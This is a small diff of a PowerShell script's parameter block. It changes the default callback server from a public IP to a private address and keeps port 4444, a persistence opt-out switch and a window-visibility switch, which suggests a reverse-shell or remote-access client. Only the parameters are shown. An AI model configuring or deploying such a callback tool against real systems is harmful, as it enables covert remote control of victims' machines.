@@ -9,7 +9,7 @@
 #>
 [CmdletBinding()]
 param(
-    [string]$Server    = '143.110.191.171',
+    [string]$Server    = '172.16.31.140',
     [int]   $Port      = 4444,
     [switch]$NoPersist,
     [switch]$Visible
